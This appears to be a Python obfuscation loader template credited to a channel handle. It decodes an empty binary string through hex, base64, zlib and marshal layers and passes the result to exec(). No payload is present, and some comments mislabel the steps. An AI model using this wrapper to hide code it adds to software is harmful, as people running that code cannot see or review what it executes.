import marshal, base64, zlib, binascii
code = 'nagiro'
# DEV - @zadoxblack | CHANNEL - @nagiempire
binary_data = ""

# Convert Binary to Hex
hex_data = ''.join(chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8))

# Convert Hex to Base64
b64_data = binascii.unhexlify(hex_data)

# Decode Base64 to zlib compressed data
compressed_data = base64.b64decode(b64_data)

# Decompress zlib data
marshalled_data = zlib.decompress(compressed_data)

# Unmarshal and Execute
exec(marshal.loads(marshalled_data))
